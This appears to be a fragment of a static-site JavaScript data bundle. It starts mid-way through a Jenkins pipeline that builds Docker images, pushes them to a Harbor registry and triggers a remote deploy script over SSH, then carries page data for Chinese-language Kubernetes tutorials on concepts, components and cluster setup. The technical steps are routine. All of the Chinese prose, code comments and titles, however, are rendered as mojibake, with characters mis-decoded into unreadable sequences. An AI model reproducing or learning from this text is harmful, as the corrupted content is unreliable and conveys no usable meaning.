selectdprojectname[i].split("@")[0]\n            def port = selectdprojectname[i].split("@")[1]\n            // ç¼è¯\n            sh "mvn -f ${project} clean package dockerfile:build"\n            echo "æjarä¸ä¼ éåä»åº"\n            def oldimagename = "${project}:latest"\n            def newimagename = "${harbor_url}/${harbor_project}/${project}:${tag}"\n            // æ¹åç§° åè§è\n            sh "docker tag ${oldimagename} ${newimagename}"\n            // å é¤ä¹åç éå\n            sh "docker rmi ${oldimagename}"\n            // æ¨éå° dockersä»åº\n            withcredentials([usernamepassword(credentialsid: \'8a3d7ab1-4cd6-482c-86c9-a12aa6404d98\', passwordvariable: \'harbor_password\', usernamevariable: \'harbor_account\')]) {\n                // ç»å½\n                sh "docker login -u ${harbor_account} -p ${harbor_password} ${harbor_url}"\n                // ä¸ä¼ \n                sh "docker push ${newimagename}"\n                echo "éåæ¨éæå"\n            }\n            for(int k=0;k<selectdservers.length;k++){\n                // è·åæå¡å¨åç§°\n                def currentservername = selectdservers[k]\n                echo "æ§è¡è¿ç¨å½ä»¤ /home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}"\n                sshpublisher(publishers: [sshpublisherdesc(configname: "${currentservername}", transfers: [sshtransfer(cleanremote: false, excludes: \'\', execcommand: "/home/server/deploy.sh ${harbor_url} ${harbor_project} ${project_name} ${tag} ${port}", exectimeout: 120000, flatten: false, makeemptydirs: false, nodefaultexcludes: false, patternseparator: \'[, ]+\', remotedirectory: \'\', remotedirectorysdf: false, removeprefix: \'\', sourcefiles: \'\')], usepromotiontimestamp: false, useworkspaceinpromotion: false, verbose: false)])\n\n            }\n        }\n    }\n}\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n',charsets:{cjk:!0}},{title:"kubernetes(ä¸) æ¦å¿µåä»ç»",frontmatter:{title:"kubernetes(ä¸) æ¦å¿µåä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/600",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/600.kubernetes(%E4%B8%80)%20%E6%A6%82%E5%BF%B5%E5%8F%8A%E4%BB%8B%E7%BB%8D.html",relativePath:"04.è¿ç»´/60.Kubernetes/600.kubernetes(ä¸) æ¦å¿µåä»ç».md",key:"v-212cb943",path:"/kubernetes/600/",headers:[{level:2,title:"1.1 åºç¨é¨ç½²æ¹å¼æ¼å",slug:"_1-1-åºç¨é¨ç½²æ¹å¼æ¼å",normalizedTitle:"1.1 åºç¨é¨ç½²æ¹å¼æ¼å",charIndex:2},{level:2,title:"1.2 kubernetesç®ä»",slug:"_1-2-kubernetesç®ä»",normalizedTitle:"1.2 kubernetes ç®ä»",charIndex:661},{level:2,title:"1.3 kubernetesç»ä»¶",slug:"_1-3-kubernetesç»ä»¶",normalizedTitle:"1.3 kubernetes ç»ä»¶",charIndex:1085},{level:2,title:"1.4 kubernetesæ¦å¿µ",slug:"_1-4-kubernetesæ¦å¿µ",normalizedTitle:"1.4 kubernetes æ¦å¿µ",charIndex:2074}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"1.1 åºç¨é¨ç½²æ¹å¼æ¼å 1.2 kubernetesç®ä» 1.3 kubernetesç»ä»¶ 1.4 kubernetesæ¦å¿µ",content:"# 1.1 åºç¨é¨ç½²æ¹å¼æ¼å\n\nå¨é¨ç½²åºç¨ç¨åºçæ¹å¼ä¸ï¼ä¸»è¦ç»åäºä¸ä¸ªæ¶ä»£ï¼\n\n * ä¼ ç»é¨ç½²ï¼äºèç½æ©æï¼ä¼ç´æ¥å°åºç¨ç¨åºé¨ç½²å¨ç©çæºä¸\n   \n   > ä¼ç¹ï¼ç®åï¼ä¸éè¦å¶å®ææ¯çåä¸\n   > ç¼ºç¹ï¼ä¸è½ä¸ºåºç¨ç¨åºå®ä¹èµæºä½¿ç¨è¾¹çï¼å¾é¾åçå°åéè®¡ç®èµæºï¼èä¸ç¨åºä¹é´å®¹æäº§çå½±å\n\n * èæåé¨ç½²ï¼å¯ä»¥å¨ä¸å°ç©çæºä¸è¿è¡å¤ä¸ªèææºï¼æ¯ä¸ªèææºé½æ¯ç¬ç«çä¸ä¸ªç¯å¢\n   \n   > ä¼ç¹ï¼ç¨åºç¯å¢ä¸ä¼ç¸äºäº§çå½±åï¼æä¾äºä¸å®ç¨åº¦çå®å¨æ§\n   > ç¼ºç¹ï¼å¢å äºæä½ç³»ç»ï¼æµªè´¹äºé¨åèµæº\n\n * å®¹å¨åé¨ç½²ï¼ä¸èæåç±»ä¼¼ï¼ä½æ¯å±äº«äºæä½ç³»ç»\n   \n   > ä¼ç¹ï¼\n   > å¯ä»¥ä¿è¯æ¯ä¸ªå®¹å¨æ¥æèªå·±çæä»¶ç³»ç»ãCPUãåå­ãè¿ç¨ç©ºé´ç­\n   > è¿è¡åºç¨ç¨åºæéè¦çèµæºé½è¢«å®¹å¨åè£ï¼å¹¶ååºå±åºç¡æ¶æè§£è¦\n   > å®¹å¨åçåºç¨ç¨åºå¯ä»¥è·¨äºæå¡åãè·¨ Linux æä½ç³»ç»åè¡çè¿è¡é¨ç½²\n\n\n\nå®¹å¨åé¨ç½²æ¹å¼ç»å¸¦æ¥å¾å¤çä¾¿å©ï¼ä½æ¯ä¹ä¼åºç°ä¸äºé®é¢ï¼æ¯å¦è¯´ï¼\n\n * ä¸ä¸ªå®¹å¨æéåæºäºï¼æä¹æ ·è®©å¦å¤ä¸ä¸ªå®¹å¨ç«å»å¯å¨å»æ¿è¡¥åæºçå®¹å¨\n * å½å¹¶åè®¿é®éåå¤§çæ¶åï¼æä¹æ ·åå°æ¨ªåæ©å±å®¹å¨æ°é\n\nè¿äºå®¹å¨ç®¡ççé®é¢ç»ç§°ä¸ºå®¹å¨ç¼æé®é¢ï¼ä¸ºäºè§£å³è¿äºå®¹å¨ç¼æé®é¢ï¼å°±äº§çäºä¸äºå®¹å¨ç¼æçè½¯ä»¶ï¼\n\n * Swarmï¼Docker èªå·±çå®¹å¨ç¼æå·¥å·\n * Mesosï¼Apache çä¸ä¸ªèµæºç»ä¸ç®¡æ§çå·¥å·ï¼éè¦å Marathon ç»åä½¿ç¨\n * Kubernetesï¼Google å¼æºççå®¹å¨ç¼æå·¥å·\n\n\n\n\n# 1.2 kubernetes ç®ä»\n\n\n\nkubernetesï¼æ¯ä¸ä¸ªå¨æ°çåºäºå®¹å¨ææ¯çåå¸å¼æ¶æé¢åæ¹æ¡ï¼æ¯è°·æ­ä¸¥æ ¼ä¿å¯åå å¹´çç§å¯æ­¦å¨ ----Borg ç³»ç»çä¸ä¸ªå¼æºçæ¬ï¼äº 2014 å¹´ 9 æåå¸ç¬¬ä¸ä¸ªçæ¬ï¼2015 å¹´ 7 æåå¸ç¬¬ä¸ä¸ªæ­£å¼çæ¬ã\n\nkubernetes çæ¬è´¨æ¯ä¸ç»æå¡å¨éç¾¤ï¼å®å¯ä»¥å¨éç¾¤çæ¯ä¸ªèç¹ä¸è¿è¡ç¹å®çç¨åºï¼æ¥å¯¹èç¹ä¸­çå®¹å¨è¿è¡ç®¡çãç®çæ¯å®ç°èµæºç®¡ççèªå¨åï¼ä¸»è¦æä¾äºå¦ä¸çä¸»è¦åè½ï¼\n\n * èªæä¿®å¤ï¼ä¸æ¦æä¸ä¸ªå®¹å¨å´©æºï¼è½å¤å¨ 1 ç§ä¸­å·¦å³è¿éå¯å¨æ°çå®¹å¨\n * å¼¹æ§ä¼¸ç¼©ï¼å¯ä»¥æ ¹æ®éè¦ï¼èªå¨å¯¹éç¾¤ä¸­æ­£å¨è¿è¡çå®¹å¨æ°éè¿è¡è°æ´\n * æå¡åç°ï¼æå¡å¯ä»¥éè¿èªå¨åç°çå½¢å¼æ¾å°å®æä¾èµçæå¡\n * è´è½½åè¡¡ï¼å¦æä¸ä¸ªæå¡èµ·å¨äºå¤ä¸ªå®¹å¨ï¼è½å¤èªå¨å®ç°è¯·æ±çè´è½½åè¡¡\n * çæ¬åéï¼å¦æåç°æ°åå¸çç¨åºçæ¬æé®é¢ï¼å¯ä»¥ç«å³åéå°åæ¥ççæ¬\n * å­å¨ç¼æï¼å¯ä»¥æ ¹æ®å®¹å¨èªèº«çéæ±èªå¨åå»ºå­å¨å·\n\n\n# 1.3 kubernetes ç»ä»¶\n\nä¸ä¸ª kubernetes éç¾¤ä¸»è¦æ¯ç±æ§å¶èç¹ (master)ã** å·¥ä½èç¹ (node)** ææï¼æ¯ä¸ªèç¹ä¸é½ä¼å®è£ä¸åçç»ä»¶ã\n\nmasterï¼éç¾¤çæ§å¶å¹³é¢ï¼è´è´£éç¾¤çå³ç­ (ç®¡ç)\n\n> ApiServer : èµæºæä½çå¯ä¸å¥å£ï¼æ¥æ¶ç¨æ·è¾å¥çå½ä»¤ï¼æä¾è®¤è¯ãææãAPI æ³¨åååç°ç­æºå¶\n> Scheduler : è´è´£éç¾¤èµæºè°åº¦ï¼æç§é¢å®çè°åº¦ç­ç¥å° Pod è°åº¦å°ç¸åºç node èç¹ä¸\n> ControllerManager : è´è´£ç»´æ¤éç¾¤çç¶æï¼æ¯å¦ç¨åºé¨ç½²å®æãæéæ£æµãèªå¨æ©å±ãæ»å¨æ´æ°ç­\n> Etcd ï¼è´è´£å­å¨éç¾¤ä¸­åç§èµæºå¯¹è±¡çä¿¡æ¯\n\nnodeï¼éç¾¤çæ°æ®å¹³é¢ï¼è´è´£ä¸ºå®¹å¨æä¾è¿è¡ç¯å¢ (å¹²æ´»)\n\n> Kubelet : è´è´£ç»´æ¤å®¹å¨ççå½å¨æï¼å³éè¿æ§å¶ dockerï¼æ¥åå»ºãæ´æ°ãéæ¯å®¹å¨\n> KubeProxy : è´è´£æä¾éç¾¤åé¨çæå¡åç°åè´è½½åè¡¡\n> Docker : è´è´£èç¹ä¸å®¹å¨çåç§æä½\n\n\n\nä¸é¢ï¼ä»¥é¨ç½²ä¸ä¸ª nginx æå¡æ¥è¯´æ kubernetes ç³»ç»åä¸ªç»ä»¶è°ç¨å³ç³»ï¼\n\n 1. é¦åè¦æç¡®ï¼ä¸æ¦ kubernetes ç¯å¢å¯å¨ä¹åï¼master å node é½ä¼å°èªèº«çä¿¡æ¯å­å¨å° etcd æ°æ®åºä¸­\n 2. ä¸ä¸ª nginx æå¡çå®è£è¯·æ±ä¼é¦åè¢«åéå° master èç¹ç apiServer ç»ä»¶\n 3. apiServer ç»ä»¶ä¼è°ç¨ scheduler ç»ä»¶æ¥å³å®å°åºåºè¯¥æè¿ä¸ªæå¡å®è£å°åªä¸ª node èç¹ä¸ï¼å¨æ­¤æ¶ï¼å®ä¼ä» etcd ä¸­è¯»ååä¸ª node èç¹çä¿¡æ¯ï¼ç¶åæç§ä¸å®çç®æ³è¿è¡éæ©ï¼å¹¶å°ç»æåç¥ apiServer\n 4. apiServer è°ç¨ controller-manager å»è°åº¦ Node èç¹å®è£ nginx æå¡\n 5. kubelet æ¥æ¶å°æä»¤åï¼ä¼éç¥ dockerï¼ç¶åç± docker æ¥å¯å¨ä¸ä¸ª nginx ç podï¼pod æ¯ kubernetes çæå°æä½ååï¼å®¹å¨å¿é¡»è·å¨ pod ä¸­è³æ­¤ï¼\n 6. ä¸ä¸ª nginx æå¡å°±è¿è¡äºï¼å¦æéè¦è®¿é® nginxï¼å°±éè¦éè¿ kube-proxy æ¥å¯¹ pod äº§çè®¿é®çä»£çè¿æ ·ï¼å¤çç¨æ·å°±å¯ä»¥è®¿é®éç¾¤ä¸­ç nginx æå¡äº\n\n\n# 1.4 kubernetes æ¦å¿µ\n\nMasterï¼éç¾¤æ§å¶èç¹ï¼æ¯ä¸ªéç¾¤éè¦è³å°ä¸ä¸ª master èç¹è´è´£éç¾¤çç®¡æ§\nNodeï¼å·¥ä½è´è½½èç¹ï¼ç± master åéå®¹å¨å°è¿äº node å·¥ä½èç¹ä¸ï¼ç¶å node èç¹ä¸ç docker è´è´£å®¹å¨çè¿è¡\nPodï¼kubernetes çæå°æ§å¶ååï¼å®¹å¨é½æ¯è¿è¡å¨ pod ä¸­çï¼ä¸ä¸ª pod ä¸­å¯ä»¥æ 1 ä¸ªæèå¤ä¸ªå®¹å¨\nControllerï¼æ§å¶å¨ï¼éè¿å®æ¥å®ç°å¯¹ pod çç®¡çï¼æ¯å¦å¯å¨ podãåæ­¢ podãä¼¸ç¼© pod çæ°éç­ç­\nServiceï¼pod å¯¹å¤æå¡çç»ä¸å¥å£ï¼ä¸é¢å¯ä»¥ç»´æ¤èåä¸ç±»çå¤ä¸ª pod\nLabelï¼æ ç­¾ï¼ç¨äºå¯¹ pod è¿è¡åç±»ï¼åä¸ç±» pod ä¼æ¥æç¸åçæ ç­¾\nNameSpaceï¼å½åç©ºé´ï¼ç¨æ¥éç¦» pod çè¿è¡ç¯å¢\n\n",normalizedContent:"# 1.1 åºç¨é¨ç½²æ¹å¼æ¼å\n\nå¨é¨ç½²åºç¨ç¨åºçæ¹å¼ä¸ï¼ä¸»è¦ç»åäºä¸ä¸ªæ¶ä»£ï¼\n\n * ä¼ ç»é¨ç½²ï¼äºèç½æ©æï¼ä¼ç´æ¥å°åºç¨ç¨åºé¨ç½²å¨ç©çæºä¸\n   \n   > ä¼ç¹ï¼ç®åï¼ä¸éè¦å¶å®ææ¯çåä¸\n   > ç¼ºç¹ï¼ä¸è½ä¸ºåºç¨ç¨åºå®ä¹èµæºä½¿ç¨è¾¹çï¼å¾é¾åçå°åéè®¡ç®èµæºï¼èä¸ç¨åºä¹é´å®¹æäº§çå½±å\n\n * èæåé¨ç½²ï¼å¯ä»¥å¨ä¸å°ç©çæºä¸è¿è¡å¤ä¸ªèææºï¼æ¯ä¸ªèææºé½æ¯ç¬ç«çä¸ä¸ªç¯å¢\n   \n   > ä¼ç¹ï¼ç¨åºç¯å¢ä¸ä¼ç¸äºäº§çå½±åï¼æä¾äºä¸å®ç¨åº¦çå®å¨æ§\n   > ç¼ºç¹ï¼å¢å äºæä½ç³»ç»ï¼æµªè´¹äºé¨åèµæº\n\n * å®¹å¨åé¨ç½²ï¼ä¸èæåç±»ä¼¼ï¼ä½æ¯å±äº«äºæä½ç³»ç»\n   \n   > ä¼ç¹ï¼\n   > å¯ä»¥ä¿è¯æ¯ä¸ªå®¹å¨æ¥æèªå·±çæä»¶ç³»ç»ãcpuãåå­ãè¿ç¨ç©ºé´ç­\n   > è¿è¡åºç¨ç¨åºæéè¦çèµæºé½è¢«å®¹å¨åè£ï¼å¹¶ååºå±åºç¡æ¶æè§£è¦\n   > å®¹å¨åçåºç¨ç¨åºå¯ä»¥è·¨äºæå¡åãè·¨ linux æä½ç³»ç»åè¡çè¿è¡é¨ç½²\n\n\n\nå®¹å¨åé¨ç½²æ¹å¼ç»å¸¦æ¥å¾å¤çä¾¿å©ï¼ä½æ¯ä¹ä¼åºç°ä¸äºé®é¢ï¼æ¯å¦è¯´ï¼\n\n * ä¸ä¸ªå®¹å¨æéåæºäºï¼æä¹æ ·è®©å¦å¤ä¸ä¸ªå®¹å¨ç«å»å¯å¨å»æ¿è¡¥åæºçå®¹å¨\n * å½å¹¶åè®¿é®éåå¤§çæ¶åï¼æä¹æ ·åå°æ¨ªåæ©å±å®¹å¨æ°é\n\nè¿äºå®¹å¨ç®¡ççé®é¢ç»ç§°ä¸ºå®¹å¨ç¼æé®é¢ï¼ä¸ºäºè§£å³è¿äºå®¹å¨ç¼æé®é¢ï¼å°±äº§çäºä¸äºå®¹å¨ç¼æçè½¯ä»¶ï¼\n\n * swarmï¼docker èªå·±çå®¹å¨ç¼æå·¥å·\n * mesosï¼apache çä¸ä¸ªèµæºç»ä¸ç®¡æ§çå·¥å·ï¼éè¦å marathon ç»åä½¿ç¨\n * kubernetesï¼google å¼æºççå®¹å¨ç¼æå·¥å·\n\n\n\n\n# 1.2 kubernetes ç®ä»\n\n\n\nkubernetesï¼æ¯ä¸ä¸ªå¨æ°çåºäºå®¹å¨ææ¯çåå¸å¼æ¶æé¢åæ¹æ¡ï¼æ¯è°·æ­ä¸¥æ ¼ä¿å¯åå å¹´çç§å¯æ­¦å¨ ----borg ç³»ç»çä¸ä¸ªå¼æºçæ¬ï¼äº 2014 å¹´ 9 æåå¸ç¬¬ä¸ä¸ªçæ¬ï¼2015 å¹´ 7 æåå¸ç¬¬ä¸ä¸ªæ­£å¼çæ¬ã\n\nkubernetes çæ¬è´¨æ¯ä¸ç»æå¡å¨éç¾¤ï¼å®å¯ä»¥å¨éç¾¤çæ¯ä¸ªèç¹ä¸è¿è¡ç¹å®çç¨åºï¼æ¥å¯¹èç¹ä¸­çå®¹å¨è¿è¡ç®¡çãç®çæ¯å®ç°èµæºç®¡ççèªå¨åï¼ä¸»è¦æä¾äºå¦ä¸çä¸»è¦åè½ï¼\n\n * èªæä¿®å¤ï¼ä¸æ¦æä¸ä¸ªå®¹å¨å´©æºï¼è½å¤å¨ 1 ç§ä¸­å·¦å³è¿éå¯å¨æ°çå®¹å¨\n * å¼¹æ§ä¼¸ç¼©ï¼å¯ä»¥æ ¹æ®éè¦ï¼èªå¨å¯¹éç¾¤ä¸­æ­£å¨è¿è¡çå®¹å¨æ°éè¿è¡è°æ´\n * æå¡åç°ï¼æå¡å¯ä»¥éè¿èªå¨åç°çå½¢å¼æ¾å°å®æä¾èµçæå¡\n * è´è½½åè¡¡ï¼å¦æä¸ä¸ªæå¡èµ·å¨äºå¤ä¸ªå®¹å¨ï¼è½å¤èªå¨å®ç°è¯·æ±çè´è½½åè¡¡\n * çæ¬åéï¼å¦æåç°æ°åå¸çç¨åºçæ¬æé®é¢ï¼å¯ä»¥ç«å³åéå°åæ¥ççæ¬\n * å­å¨ç¼æï¼å¯ä»¥æ ¹æ®å®¹å¨èªèº«çéæ±èªå¨åå»ºå­å¨å·\n\n\n# 1.3 kubernetes ç»ä»¶\n\nä¸ä¸ª kubernetes éç¾¤ä¸»è¦æ¯ç±æ§å¶èç¹ (master)ã** å·¥ä½èç¹ (node)** ææï¼æ¯ä¸ªèç¹ä¸é½ä¼å®è£ä¸åçç»ä»¶ã\n\nmasterï¼éç¾¤çæ§å¶å¹³é¢ï¼è´è´£éç¾¤çå³ç­ (ç®¡ç)\n\n> apiserver : èµæºæä½çå¯ä¸å¥å£ï¼æ¥æ¶ç¨æ·è¾å¥çå½ä»¤ï¼æä¾è®¤è¯ãææãapi æ³¨åååç°ç­æºå¶\n> scheduler : è´è´£éç¾¤èµæºè°åº¦ï¼æç§é¢å®çè°åº¦ç­ç¥å° pod è°åº¦å°ç¸åºç node èç¹ä¸\n> controllermanager : è´è´£ç»´æ¤éç¾¤çç¶æï¼æ¯å¦ç¨åºé¨ç½²å®æãæéæ£æµãèªå¨æ©å±ãæ»å¨æ´æ°ç­\n> etcd ï¼è´è´£å­å¨éç¾¤ä¸­åç§èµæºå¯¹è±¡çä¿¡æ¯\n\nnodeï¼éç¾¤çæ°æ®å¹³é¢ï¼è´è´£ä¸ºå®¹å¨æä¾è¿è¡ç¯å¢ (å¹²æ´»)\n\n> kubelet : è´è´£ç»´æ¤å®¹å¨ççå½å¨æï¼å³éè¿æ§å¶ dockerï¼æ¥åå»ºãæ´æ°ãéæ¯å®¹å¨\n> kubeproxy : è´è´£æä¾éç¾¤åé¨çæå¡åç°åè´è½½åè¡¡\n> docker : è´è´£èç¹ä¸å®¹å¨çåç§æä½\n\n\n\nä¸é¢ï¼ä»¥é¨ç½²ä¸ä¸ª nginx æå¡æ¥è¯´æ kubernetes ç³»ç»åä¸ªç»ä»¶è°ç¨å³ç³»ï¼\n\n 1. é¦åè¦æç¡®ï¼ä¸æ¦ kubernetes ç¯å¢å¯å¨ä¹åï¼master å node é½ä¼å°èªèº«çä¿¡æ¯å­å¨å° etcd æ°æ®åºä¸­\n 2. ä¸ä¸ª nginx æå¡çå®è£è¯·æ±ä¼é¦åè¢«åéå° master èç¹ç apiserver ç»ä»¶\n 3. apiserver ç»ä»¶ä¼è°ç¨ scheduler ç»ä»¶æ¥å³å®å°åºåºè¯¥æè¿ä¸ªæå¡å®è£å°åªä¸ª node èç¹ä¸ï¼å¨æ­¤æ¶ï¼å®ä¼ä» etcd ä¸­è¯»ååä¸ª node èç¹çä¿¡æ¯ï¼ç¶åæç§ä¸å®çç®æ³è¿è¡éæ©ï¼å¹¶å°ç»æåç¥ apiserver\n 4. apiserver è°ç¨ controller-manager å»è°åº¦ node èç¹å®è£ nginx æå¡\n 5. kubelet æ¥æ¶å°æä»¤åï¼ä¼éç¥ dockerï¼ç¶åç± docker æ¥å¯å¨ä¸ä¸ª nginx ç podï¼pod æ¯ kubernetes çæå°æä½ååï¼å®¹å¨å¿é¡»è·å¨ pod ä¸­è³æ­¤ï¼\n 6. ä¸ä¸ª nginx æå¡å°±è¿è¡äºï¼å¦æéè¦è®¿é® nginxï¼å°±éè¦éè¿ kube-proxy æ¥å¯¹ pod äº§çè®¿é®çä»£çè¿æ ·ï¼å¤çç¨æ·å°±å¯ä»¥è®¿é®éç¾¤ä¸­ç nginx æå¡äº\n\n\n# 1.4 kubernetes æ¦å¿µ\n\nmasterï¼éç¾¤æ§å¶èç¹ï¼æ¯ä¸ªéç¾¤éè¦è³å°ä¸ä¸ª master èç¹è´è´£éç¾¤çç®¡æ§\nnodeï¼å·¥ä½è´è½½èç¹ï¼ç± master åéå®¹å¨å°è¿äº node å·¥ä½èç¹ä¸ï¼ç¶å node èç¹ä¸ç docker è´è´£å®¹å¨çè¿è¡\npodï¼kubernetes çæå°æ§å¶ååï¼å®¹å¨é½æ¯è¿è¡å¨ pod ä¸­çï¼ä¸ä¸ª pod ä¸­å¯ä»¥æ 1 ä¸ªæèå¤ä¸ªå®¹å¨\ncontrollerï¼æ§å¶å¨ï¼éè¿å®æ¥å®ç°å¯¹ pod çç®¡çï¼æ¯å¦å¯å¨ podãåæ­¢ podãä¼¸ç¼© pod çæ°éç­ç­\nserviceï¼pod å¯¹å¤æå¡çç»ä¸å¥å£ï¼ä¸é¢å¯ä»¥ç»´æ¤èåä¸ç±»çå¤ä¸ª pod\nlabelï¼æ ç­¾ï¼ç¨äºå¯¹ pod è¿è¡åç±»ï¼åä¸ç±» pod ä¼æ¥æç¸åçæ ç­¾\nnamespaceï¼å½åç©ºé´ï¼ç¨æ¥éç¦» pod çè¿è¡ç¯å¢\n\n",charsets:{cjk:!0}},{title:"kubernetes(äº) éç¾¤ç¯å¢æ­å»º",frontmatter:{title:"kubernetes(äº) éç¾¤ç¯å¢æ­å»º",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/601",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/601.kubernetes(%E4%BA%8C)%20%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"04.è¿ç»´/60.Kubernetes/601.kubernetes(äº) éç¾¤ç¯å¢æ­å»º.md",key:"v-80701660",path:"/kubernetes/601/",headers:[{level:2,title:"1 åç½®ç¥è¯ç¹",slug:"_1-åç½®ç¥è¯ç¹",normalizedTitle:"1 åç½®ç¥è¯ç¹",charIndex:2},{level:3,title:"1.2 å®è£æ¹å¼",slug:"_1-2-å®è£æ¹å¼",normalizedTitle:"1.2 å®è£æ¹å¼",charIndex:158},{level:3,title:"1.3 kubeadm é¨ç½²æ¹å¼ä»ç»",slug:"_1-3-kubeadm-é¨ç½²æ¹å¼ä»ç»",normalizedTitle:"1.3 kubeadm é¨ç½²æ¹å¼ä»ç»",charIndex:370},{level:3,title:"1.4 å®è£è¦æ±",slug:"_1-4-å®è£è¦æ±",normalizedTitle:"1.4 å®è£è¦æ±",charIndex:590},{level:3,title:"1.5 æç»ç®æ ",slug:"_1-5-æç»ç®æ ",normalizedTitle:"1.5 æç»ç®æ ",charIndex:770},{level:2,title:"2 å®è£é¨ç½²",slug:"_2-å®è£é¨ç½²",normalizedTitle:"2 å®è£é¨ç½²",charIndex:935},{level:3,title:"2.1 hostnameåè§£æ",slug:"_2-1-hostnameåè§£æ",normalizedTitle:"2.1 hostname åè§£æ",charIndex:1237},{level:3,title:"2.2 æ¶é´åæ­¥",slug:"_2-2-æ¶é´åæ­¥",normalizedTitle:"2.2 æ¶é´åæ­¥",charIndex:1537},{level:3,title:"2.3 ç¦ç¨iptables å firewalld æå¡",slug:"_2-3-ç¦ç¨iptables-å-firewalld-æå¡",normalizedTitle:"2.3 ç¦ç¨ iptables å firewalld æå¡",charIndex:1763},{level:3,title:"2.4 ç¦ç¨ selinux",slug:"_2-4-ç¦ç¨-selinux",normalizedTitle:"2.4 ç¦ç¨ selinux",charIndex:2048},{level:3,title:"2.5 ç¦swapç¨ååº",slug:"_2-5-ç¦swapç¨ååº",normalizedTitle:"2.5 ç¦ swap ç¨ååº",charIndex:2197},{level:3,title:"2.6 ä¿®æ¹linxuçåæ ¸åæ°",slug:"_2-6-ä¿®æ¹linxuçåæ ¸åæ°",normalizedTitle:"2.6 ä¿®æ¹ linxu çåæ ¸åæ°",charIndex:2526},{level:3,title:"2.7 éç½® ipvs",slug:"_2-7-éç½®-ipvs",normalizedTitle:"2.7 éç½® ipvs",charIndex:3153},{level:3,title:"2.8 docker å®è£",slug:"_2-8-docker-å®è£",normalizedTitle:"2.8 docker å®è£",charIndex:3786},{level:3,title:"2.9 å®è£kubernetesç»ä»¶",slug:"_2-9-å®è£kubernetesç»ä»¶",normalizedTitle:"2.9 å®è£ kubernetes ç»ä»¶",charIndex:4703},{level:3,title:"2.10 éç¾¤åå§å",slug:"_2-10-éç¾¤åå§å",normalizedTitle:"2.10 éç¾¤åå§å",charIndex:5281},{level:4,title:"åå¤éå",slug:"åå¤éå",normalizedTitle:"åå¤éå",charIndex:5295},{level:4,title:"åå§å",slug:"åå§å",normalizedTitle:"åå§å",charIndex:5288},{level:3,title:"2.11 å®è£ç½ç»æä»¶",slug:"_2-11-å®è£ç½ç»æä»¶",normalizedTitle:"2.11 å®è£ç½ç»æä»¶",charIndex:6784},{level:4,title:"master æä½",slug:"master-æä½",normalizedTitle:"master æä½",charIndex:6869},{level:2,title:"æå¡é¨ç½²",slug:"æå¡é¨ç½²",normalizedTitle:"æå¡é¨ç½²",charIndex:23743}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"1 åç½®ç¥è¯ç¹ 1.2 å®è£æ¹å¼ 1.3 kubeadm é¨ç½²æ¹å¼ä»ç» 1.4 å®è£è¦æ± 1.5 æç»ç®æ  2 å®è£é¨ç½² 2.1 hostnameåè§£æ 2.2 æ¶é´åæ­¥ 2.3 ç¦ç¨iptables å firewalld æå¡ 2.4 ç¦ç¨ selinux 2.5 ç¦swapç¨ååº 2.6 ä¿®æ¹linxuçåæ ¸åæ° 2.7 éç½® ipvs 2.8 docker å®è£ 2.9 å®è£kubernetesç»ä»¶ 2.10 éç¾¤åå§å åå¤éå åå§å 2.11 å®è£ç½ç»æä»¶ master æä½ æå¡é¨ç½²",content:'# 1 åç½®ç¥è¯ç¹\n\nKubernetes éç¾¤å¤§ä½ä¸åä¸ºä¸¤ç±»ï¼ä¸ä¸»å¤ä» å å¤ä¸»å¤ä»ã\n\n * ä¸ä¸»å¤ä»ï¼ä¸å° Mater èç¹åå¤å° Node èç¹ï¼æ­å»ºç®åï¼ä½æ¯ç±åæºæéé£é©ï¼éåç¨äºæµè¯ç¯å¢\n * å¤ä¸»å¤ä»ï¼å¤å° Master èç¹åå¤å° Node èç¹ï¼æ­å»ºéº»ç¦ï¼å®å¨æ§é«ï¼éç¨äºçäº§ç¯å¢ã\n\n\n\n\n# 1.2 å®è£æ¹å¼\n\nKubernetes å¤æå¤ç§é¨ç½²æ¹å¼ï¼ç®åä¸»æµçæ¹å¼ç± kubeadmãminikubeãäºè¿å¶å\n\n * minikubeï¼ä¸ä¸ªç¨äºå¿«éæ­å»ºåèç¹ kubernetes çå·¥å·\n * kubeadmï¼ä¸ä¸ªç¨å¿«éæ­å»º kubernetes éç¾¤çå·¥å·\n * äºè¿å¶åï¼ä»å®ç½ä¸è½½æ¯ä¸ªç»ä»¶çäºè¿å¶åï¼ä»¥æ­¤å»å®è£ï¼æ­¤æ¹å¼å¯¹äºçè§£ kubernetes ç»ä»¶æ´å ææ\n\n> æ°ææ¨è kubeadm\n\n\n# 1.3 kubeadm é¨ç½²æ¹å¼ä»ç»\n\nkubeadm æ¯å®æ¹ç¤¾åºæ¨åºçä¸ä¸ªç¨äºå¿«éé¨ç½² kubernetes éç¾¤çå·¥å·ï¼è¿ä¸ªå·¥å·è½éè¿ä¸¤æ¡æä»¤å®æä¸ä¸ª kubernetes éç¾¤çé¨ç½²ï¼\n\n * åå»ºä¸ä¸ª Master èç¹ kubeadm init\n * å° Node èç¹å å¥å°å½åéç¾¤ä¸­ $ kubeadm join <Master èç¹ç IP åç«¯å£>\n\n> kubeadm å®è£éç¾¤è¦æ± centos7.5 åä»¥ä¸\n\n\n# 1.4 å®è£è¦æ±\n\nå¨å¼å§ä¹åï¼é¨ç½² Kubernetes éç¾¤æºå¨éè¦æ»¡è¶³ä»¥ä¸å ä¸ªæ¡ä»¶ï¼\n\n * ä¸å°æå¤å°æºå¨ï¼æä½ç³»ç» CentOS7.x-86_x64\n * ç¡¬ä»¶éç½®ï¼2GB ææ´å¤ RAMï¼2 ä¸ª CPU ææ´å¤ CPUï¼ç¡¬ç 30GB ææ´å¤\n * 